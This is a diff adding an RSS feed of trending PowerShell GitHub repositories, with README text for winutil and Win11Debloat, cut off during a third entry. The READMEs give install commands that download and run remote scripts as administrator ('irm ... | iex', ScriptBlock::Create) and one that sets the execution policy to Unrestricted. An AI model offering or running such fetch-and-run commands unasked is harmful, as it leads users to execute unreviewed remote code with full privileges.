@@ -1,0 +1,1691 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>GitHub PowerShell Monthly Trending</title>
+    <description>Monthly Trending of PowerShell in GitHub</description>
+    <pubDate>Fri, 24 Jul 2026 01:45:48 GMT</pubDate>
+    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
+    
+    <item>
+      <title>ChrisTitusTech/winutil</title>
+      <link>https://github.com/ChrisTitusTech/winutil</link>
+      <description>&lt;p&gt;Chris Titus Tech&#39;s Windows Utility - Install Programs, Tweaks, Fixes, and Updates&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Chris Titus Tech&#39;s Windows Utility&lt;/h1&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/releases/latest&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/ChrisTitusTech/winutil?color=%230567ff&amp;amp;label=Latest%20Release&amp;amp;style=for-the-badge&quot; alt=&quot;Version&quot; /&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/downloads/ChrisTitusTech/winutil/winutil.ps1?label=Total%20Downloads&amp;amp;style=for-the-badge&quot; alt=&quot;Downloads&quot; /&gt; &lt;a href=&quot;https://discord.gg/RUbZUZyByQ&quot;&gt;&lt;img src=&quot;https://dcbadge.limes.pink/api/server/https://discord.gg/RUbZUZyByQ?theme=default-inverted&amp;amp;style=for-the-badge&quot; alt=&quot;Discord&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A curated compilation of Windows system tasks streamline &lt;strong&gt;installs&lt;/strong&gt;, debloat with &lt;strong&gt;tweaks&lt;/strong&gt;, troubleshoot with &lt;strong&gt;config&lt;/strong&gt;, and configure &lt;strong&gt;Windows updates&lt;/strong&gt;. Run it fresh on every new Windows install.&lt;/p&gt; 
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/ChrisTitusTech/winutil/main/docs/assets/images/Title-Screen.png&quot; alt=&quot;Title Screen&quot; /&gt;&lt;/p&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Quick Start&lt;/h2&gt; 
+&lt;blockquote&gt; 
+ &lt;p&gt;&lt;strong&gt;WinUtil must be run as Administrator&lt;/strong&gt; Because it performs system-wide changes.&lt;/p&gt; 
+&lt;/blockquote&gt; 
+&lt;p&gt;Open PowerShell or Terminal as admin, then run:&lt;/p&gt; 
+&lt;p&gt;&lt;strong&gt;Stable Branch (recommended)&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;irm https://christitus.com/win | iex
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;&lt;strong&gt;Development Branch&lt;/strong&gt;&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;irm https://christitus.com/windev | iex
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;h3&gt;How to open an admin terminal&lt;/h3&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;strong&gt;Start menu:&lt;/strong&gt; Right-click Start → &lt;em&gt;Windows PowerShell (Admin)&lt;/em&gt; or &lt;em&gt;Terminal (Admin)&lt;/em&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;strong&gt;Search:&lt;/strong&gt; Press the &lt;code&gt;Windows key&lt;/code&gt;, and type &lt;code&gt;PowerShell&lt;/code&gt; or &lt;code&gt;Terminal&lt;/code&gt;, then &lt;code&gt;Ctrl + Shift + Enter&lt;/code&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Automation / Presets&lt;/h2&gt; 
+&lt;p&gt;Apply a predefined configuration without manual selection:&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;&amp;amp; ([ScriptBlock]::Create((irm https://christitus.com/win))) -Preset Standard
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;table&gt; 
+ &lt;thead&gt; 
+  &lt;tr&gt; 
+   &lt;th&gt;Preset&lt;/th&gt; 
+   &lt;th&gt;Description&lt;/th&gt; 
+  &lt;/tr&gt; 
+ &lt;/thead&gt; 
+ &lt;tbody&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;&lt;code&gt;Standard&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;Balanced defaults for most users&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;&lt;code&gt;Minimal&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;Minimal changes to suit every user&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td&gt;&lt;code&gt;Advanced&lt;/code&gt;&lt;/td&gt; 
+   &lt;td&gt;Deep tweaks for power users&lt;/td&gt; 
+  &lt;/tr&gt; 
+ &lt;/tbody&gt; 
+&lt;/table&gt; 
+&lt;p&gt;To view exactly what each preset does, see: &lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/raw/main/config/preset.json&quot;&gt;https://github.com/ChrisTitusTech/winutil/blob/main/config/preset.json&lt;/a&gt;&lt;/p&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Build &amp;amp; Develop&lt;/h2&gt; 
+&lt;p&gt;See &lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/raw/main/.github/CONTRIBUTING.md&quot;&gt;https://github.com/ChrisTitusTech/winutil/blob/main/.github/CONTRIBUTING.md&lt;/a&gt;&lt;/p&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Resources&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://winutil.christitus.com/&quot;&gt;Official Documentation&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=6UQZ5oQg8XA&quot;&gt;YouTube Tutorial&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://christitus.com/windows-tool/&quot;&gt;ChrisTitus.com Article&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://winutil.christitus.com/knownissues/&quot;&gt;Known Issues&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/issues&quot;&gt;Report an Issue&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Support&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Leave a ⭐ to show support!&lt;/li&gt; 
+ &lt;li&gt;EXE Wrapper for $10 @ &lt;a href=&quot;https://www.cttstore.com/windows-toolbox&quot;&gt;https://www.cttstore.com/windows-toolbox&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Sponsors&lt;/h2&gt; 
+&lt;p&gt;These are the sponsors that help keep this project alive with monthly contributions.&lt;/p&gt; 
+&lt;!-- sponsors --&gt;
+&lt;a href=&quot;https://github.com/ysaito8015&quot;&gt;&lt;img src=&quot;https://github.com/ysaito8015.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Yusuke Saito&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/dwelfusius&quot;&gt;&lt;img src=&quot;https://github.com/dwelfusius.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/mews-se&quot;&gt;&lt;img src=&quot;https://github.com/mews-se.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Martin Stockzell&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/jdiegmueller&quot;&gt;&lt;img src=&quot;https://github.com/jdiegmueller.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Jason A. Diegmueller&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/robertsandrock&quot;&gt;&lt;img src=&quot;https://github.com/robertsandrock.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: RMS&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/paulsheets&quot;&gt;&lt;img src=&quot;https://github.com/paulsheets.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Paul&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/djones369&quot;&gt;&lt;img src=&quot;https://github.com/djones369.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Dave J  (WhamGeek)&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/anthonymendez&quot;&gt;&lt;img src=&quot;https://github.com/anthonymendez.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Anthony Mendez&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/FatBastard0&quot;&gt;&lt;img src=&quot;https://github.com/FatBastard0.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/DursleyGuy&quot;&gt;&lt;img src=&quot;https://github.com/DursleyGuy.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: DursleyGuy&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/DwayneTheRockLobster1&quot;&gt;&lt;img src=&quot;https://github.com/DwayneTheRockLobster1.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/KieraKujisawa&quot;&gt;&lt;img src=&quot;https://github.com/KieraKujisawa.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Kiera Meredith&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/andrewpayne68&quot;&gt;&lt;img src=&quot;https://github.com/andrewpayne68.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Andrew P&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/johanwildeboer&quot;&gt;&lt;img src=&quot;https://github.com/johanwildeboer.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: &quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/lukas346&quot;&gt;&lt;img src=&quot;https://github.com/lukas346.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Wook&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/tsv31&quot;&gt;&lt;img src=&quot;https://github.com/tsv31.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Sorin&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;https://github.com/seanh1995&quot;&gt;&lt;img src=&quot;https://github.com/seanh1995.png&quot; width=&quot;60px&quot; alt=&quot;User avatar: Sean (ANGRYxScotsman)&quot; /&gt;&lt;/a&gt;
+&lt;!-- sponsors --&gt; 
+&lt;hr /&gt; 
+&lt;h2&gt;Contributors&lt;/h2&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil/graphs/contributors&quot;&gt;&lt;img src=&quot;https://contrib.rocks/image?repo=ChrisTitusTech/winutil&quot; alt=&quot;Contributors&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Thanks to everyone who has contributed time and effort to this project. Keep rocking 🍻&lt;/p&gt;</description>
+      
+      <media:content url="https://opengraph.githubassets.com/da52bf230ff2d236575a1c2d760c756052b2b28225c52ba24f790563cdb376a9/ChrisTitusTech/winutil" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>Raphire/Win11Debloat</title>
+      <link>https://github.com/Raphire/Win11Debloat</link>
+      <description>&lt;p&gt;A simple, lightweight PowerShell script that allows you to remove pre-installed apps, disable telemetry, as well as perform various other changes to declutter and customize your Windows experience. Win11Debloat works for both Windows 10 and Windows 11.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Win11Debloat&lt;/h1&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/releases/latest&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/Raphire/Win11Debloat?style=for-the-badge&amp;amp;label=Latest%20release&quot; alt=&quot;GitHub Release&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/discussions&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&amp;amp;logo=github&amp;amp;logoColor=white&quot; alt=&quot;Join the Discussion&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Documentation-_?style=for-the-badge&amp;amp;logo=bookstack&amp;amp;color=grey&quot; alt=&quot;Static Badge&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Win11Debloat is a lightweight, easy to use PowerShell script that allows you to quickly declutter and customize your Windows experience, no installation required! You can use it to remove pre-installed apps, disable telemetry, remove intrusive interface elements and much more. No need to painstakingly go through all the settings yourself or remove apps one by one. Win11Debloat makes the process quick and easy!&lt;/p&gt; 
+&lt;p&gt;The script also includes many features that system administrators and power users will enjoy. Such as a powerful command-line interface, support for Windows Audit mode and the ability to make changes to other Windows users. You can also easily export &amp;amp; import your preferred settings, allowing you to quickly apply the same settings on all your systems. Please refer to our &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki&quot;&gt;wiki&lt;/a&gt; for more details.&lt;/p&gt; 
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Raphire/Win11Debloat/master/Assets/Images/menu.png&quot; alt=&quot;Win11Debloat Menu&quot; /&gt;&lt;/p&gt; 
+&lt;h4&gt;Did this script help you? Please consider buying me a cup of coffee to support my work&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://ko-fi.com/M4M5C6UPC&quot;&gt;&lt;img src=&quot;https://ko-fi.com/img/githubbutton_sm.svg?sanitize=true&quot; alt=&quot;ko-fi&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;h2&gt;Usage&lt;/h2&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-warning&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-alert mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Warning&lt;/p&gt;
+ &lt;p&gt;Great care went into making sure this script does not unintentionally break any OS functionality, but use at your own risk! If you run into any issues, please report them &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/issues&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;h3&gt;Quick method&lt;/h3&gt; 
+&lt;p&gt;Download &amp;amp; run the script automatically via PowerShell.&lt;/p&gt; 
+&lt;ol&gt; 
+ &lt;li&gt;Open PowerShell or Terminal.&lt;/li&gt; 
+ &lt;li&gt;Copy and paste the command below into PowerShell:&lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;&amp;amp; ([scriptblock]::Create((irm &quot;https://debloat.raphi.re/&quot;)))
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;ol start=&quot;3&quot;&gt; 
+ &lt;li&gt;Wait for the script to automatically download and launch Win11Debloat.&lt;/li&gt; 
+ &lt;li&gt;Carefully read through and follow the on-screen instructions.&lt;/li&gt; 
+&lt;/ol&gt; 
+&lt;p&gt;This method supports command-line parameters to customize the behaviour of the script. Please click &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Command%E2%80%90line-Interface#parameters&quot;&gt;here&lt;/a&gt; for more information.&lt;/p&gt; 
+&lt;h3&gt;Traditional method&lt;/h3&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;Manually download &amp;amp; run the script.&lt;/summary&gt;
+ &lt;br /&gt; 
+ &lt;ol&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/releases/latest&quot;&gt;Download the latest version of the script&lt;/a&gt;, and extract the .ZIP file to your desired location.&lt;/li&gt; 
+  &lt;li&gt;Navigate to the Win11Debloat folder&lt;/li&gt; 
+  &lt;li&gt;Double click the &lt;code&gt;Run.bat&lt;/code&gt; file to start the script. NOTE: If the console window immediately closes and nothing happens, try the advanced method below.&lt;/li&gt; 
+  &lt;li&gt;Accept the Windows UAC prompt to run the script as administrator, this is required for the script to function.&lt;/li&gt; 
+  &lt;li&gt;Carefully read through and follow the on-screen instructions.&lt;/li&gt; 
+ &lt;/ol&gt; 
+&lt;/details&gt; 
+&lt;h3&gt;Advanced method&lt;/h3&gt; 
+&lt;details&gt; 
+ &lt;summary&gt;Manually download the script &amp;amp; run the script via PowerShell. Recommended for advanced users.&lt;/summary&gt;
+ &lt;br /&gt; 
+ &lt;ol&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/releases/latest&quot;&gt;Download the latest version of the script&lt;/a&gt;, and extract the .ZIP file to your desired location.&lt;/li&gt; 
+  &lt;li&gt;Open PowerShell or Terminal as an administrator.&lt;/li&gt; 
+  &lt;li&gt;Temporarily enable PowerShell execution by entering the following command:&lt;/li&gt; 
+ &lt;/ol&gt; 
+ &lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;Set-ExecutionPolicy Unrestricted -Scope Process -Force
+&lt;/code&gt;&lt;/pre&gt; 
+ &lt;ol start=&quot;4&quot;&gt; 
+  &lt;li&gt;In PowerShell, navigate to the directory where the files were extracted. Example: &lt;code&gt;cd c:\Win11Debloat&lt;/code&gt;&lt;/li&gt; 
+  &lt;li&gt;Now run the script by entering the following command:&lt;/li&gt; 
+ &lt;/ol&gt; 
+ &lt;pre&gt;&lt;code class=&quot;language-PowerShell&quot;&gt;.\Win11Debloat.ps1
+&lt;/code&gt;&lt;/pre&gt; 
+ &lt;ol start=&quot;6&quot;&gt; 
+  &lt;li&gt;Carefully read through and follow the on-screen instructions.&lt;/li&gt; 
+ &lt;/ol&gt; 
+ &lt;p&gt;This method supports command-line parameters to customize the behaviour of the script. Please click &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Command%E2%80%90line-Interface#parameters&quot;&gt;here&lt;/a&gt; for more information.&lt;/p&gt; 
+&lt;/details&gt; 
+&lt;h2&gt;Features&lt;/h2&gt; 
+&lt;p&gt;Below is an overview of the key features and functionality offered by Win11Debloat. You can visit the &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki&quot;&gt;the wiki&lt;/a&gt; for more details.&lt;/p&gt; 
+&lt;div class=&quot;markdown-alert markdown-alert-tip&quot;&gt;
+ &lt;p class=&quot;markdown-alert-title&quot;&gt;
+  &lt;svg class=&quot;octicon octicon-light-bulb mr-2&quot; viewbox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;16&quot; height=&quot;16&quot; aria-hidden=&quot;true&quot;&gt;
+   &lt;path d=&quot;M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z&quot;&gt;&lt;/path&gt;
+  &lt;/svg&gt;Tip&lt;/p&gt;
+ &lt;p&gt;All of the changes made by Win11Debloat can easily be reverted and almost all of the apps can be reinstalled through the Microsoft Store. You can visit &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Reverting-Changes&quot;&gt;the wiki&lt;/a&gt; for more information on reverting changes.&lt;/p&gt; 
+&lt;/div&gt; 
+&lt;h4&gt;App Removal&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Remove a wide variety of preinstalled apps. Click &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/App-Removal&quot;&gt;here&lt;/a&gt; for more info.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Privacy &amp;amp; Suggested Content&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Disable telemetry, diagnostic data, activity history, app-launch tracking &amp;amp; targeted ads.&lt;/li&gt; 
+ &lt;li&gt;Disable tips, tricks, suggestions &amp;amp; ads across Windows, the lock screen and Microsoft Edge.&lt;/li&gt; 
+ &lt;li&gt;Disable Windows location services, app location access and Find My Device location tracking.&lt;/li&gt; 
+ &lt;li&gt;Hide Microsoft 365 ads on the Settings &#39;Home&#39; page, or hide the &#39;Home&#39; page entirely.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;AI Features&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Disable &amp;amp; remove Microsoft Copilot, Windows Recall and Click to Do.&lt;/li&gt; 
+ &lt;li&gt;Prevent AI service (WSAIFabricSvc) from starting automatically.&lt;/li&gt; 
+ &lt;li&gt;Disable AI Features in Edge, Paint and Notepad.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;System&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Disable the Drag Tray for sharing &amp;amp; moving files.&lt;/li&gt; 
+ &lt;li&gt;Restore the old Windows 10 style context menu.&lt;/li&gt; 
+ &lt;li&gt;Turn off Enhance Pointer Precision (mouse acceleration).&lt;/li&gt; 
+ &lt;li&gt;Disable the Sticky Keys keyboard shortcut.&lt;/li&gt; 
+ &lt;li&gt;Disable Storage Sense automatic disk cleanup.&lt;/li&gt; 
+ &lt;li&gt;Disable fast start-up to ensure a full shutdown.&lt;/li&gt; 
+ &lt;li&gt;Disable BitLocker automatic device encryption.&lt;/li&gt; 
+ &lt;li&gt;Disable network connectivity during Modern Standby to reduce battery drain.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Windows Update&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Prevent Windows from getting updates as soon as they&#39;re available.&lt;/li&gt; 
+ &lt;li&gt;Prevent automatic restarts after updates while signed in.&lt;/li&gt; 
+ &lt;li&gt;Disable sharing of downloaded updates with other PCs, also known as Delivery Optimization.&lt;/li&gt; 
+ &lt;li&gt;Prevent Windows from auto-installing device companion apps, like LG Monitor App, Alienware Command Center and more.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Appearance&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Enable dark mode for system and apps.&lt;/li&gt; 
+ &lt;li&gt;Disable transparency, animations and visual effects.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Start Menu &amp;amp; Search&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Customize the start menu by removing pinned apps, hiding recommendations, and customizing the &#39;All Apps&#39; section.&lt;/li&gt; 
+ &lt;li&gt;Disable the Phone Link mobile devices integration in the start menu.&lt;/li&gt; 
+ &lt;li&gt;Disable Bing web search &amp;amp; Copilot integration and Microsoft Store app suggestions in Windows search.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Taskbar&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Change taskbar alignment.&lt;/li&gt; 
+ &lt;li&gt;Customize or hide taskbar buttons like the search bar, taskview and more.&lt;/li&gt; 
+ &lt;li&gt;Disable widgets on the taskbar &amp;amp; lock screen.&lt;/li&gt; 
+ &lt;li&gt;Enable the &#39;End Task&#39; option in the taskbar right click menu to quickly force-close apps.&lt;/li&gt; 
+ &lt;li&gt;Enable the &#39;Last Active Click&#39; behavior in the taskbar app area. This allows you to repeatedly click on an application&#39;s icon in the taskbar to switch focus between the open windows of that application.&lt;/li&gt; 
+ &lt;li&gt;Customize how app buttons are shown on the taskbar.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;File Explorer&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Change the default location that File Explorer opens to.&lt;/li&gt; 
+ &lt;li&gt;Show file extensions for known file types.&lt;/li&gt; 
+ &lt;li&gt;Show hidden files, folders and drives.&lt;/li&gt; 
+ &lt;li&gt;Hide the Home, Gallery or OneDrive section from the File Explorer navigation pane.&lt;/li&gt; 
+ &lt;li&gt;Hide duplicate removable drive entries from the File Explorer navigation pane, so only the entry under &#39;This PC&#39; remains.&lt;/li&gt; 
+ &lt;li&gt;Add all common folders (Desktop, Downloads, etc.) back to &#39;This PC&#39; in File Explorer.&lt;/li&gt; 
+ &lt;li&gt;Change drive letter position or visibility in File Explorer.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Multi-tasking&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Disable window snapping.&lt;/li&gt; 
+ &lt;li&gt;Disable Snap Assist and Snap Layout suggestions when dragging or snapping windows.&lt;/li&gt; 
+ &lt;li&gt;Change whether tabs are shown when snapping windows or pressing Alt+Tab.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Optional Windows Features&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Enable Windows Sandbox, a lightweight desktop environment for safely running applications in isolation.&lt;/li&gt; 
+ &lt;li&gt;Enable Windows Subsystem for Linux which allows you to run a Linux environment directly on Windows.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Other&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Disable Xbox Game Bar integration &amp;amp; game/screen recording. This also disables &lt;code&gt;ms-gamingoverlay&lt;/code&gt;/&lt;code&gt;ms-gamebar&lt;/code&gt; popups if you uninstall the Xbox Game Bar.&lt;/li&gt; 
+ &lt;li&gt;Disable bloat in Brave browser (AI, Crypto, News, etc.)&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h4&gt;Advanced Features&lt;/h4&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Ability to &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Advanced-Features#running-as-another-user&quot;&gt;apply changes to a different user&lt;/a&gt;, instead of the currently logged in user.&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://github.com/Raphire/Win11Debloat/wiki/Advanced-Features#sysprep-mode&quot;&gt;Sysprep mode&lt;/a&gt; to apply changes to the Windows Default user profile. Which ensures, all new users will have the changes automatically applied to them.&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Contributing&lt;/h2&gt; 
+&lt;p&gt;We welcome contributions of all kinds! Please see our &lt;a href=&quot;https://github.com/Raphire/Win11Debloat/raw/master/.github/CONTRIBUTING.md&quot;&gt;Contributing Guidelines&lt;/a&gt; for detailed instructions on how to get started and best practices for contributing.&lt;/p&gt; 
+&lt;h2&gt;License&lt;/h2&gt; 
+&lt;p&gt;Win11Debloat is licensed under the MIT license. See the LICENSE file for more information.&lt;/p&gt;</description>
+      
+      <media:content url="https://repository-images.githubusercontent.com/307843105/73d2a8af-40d3-4fce-b9a3-3cfd1a24112a" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>actions/runner-images</title>
+      <link>https://github.com/actions/runner-images</link>
+      <description>&lt;p&gt;GitHub Actions runner images&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GitHub Actions Runner Images&lt;/h1&gt; 
+&lt;p&gt;&lt;strong&gt;Table of Contents&lt;/strong&gt;&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#about&quot;&gt;About&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#available-images&quot;&gt;Available Images&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#image-definitions&quot;&gt;Image Definitions&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#image-releases&quot;&gt;Image Releases&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#software-and-image-support&quot;&gt;Software and Image Support&lt;/a&gt;&lt;/li&gt; 
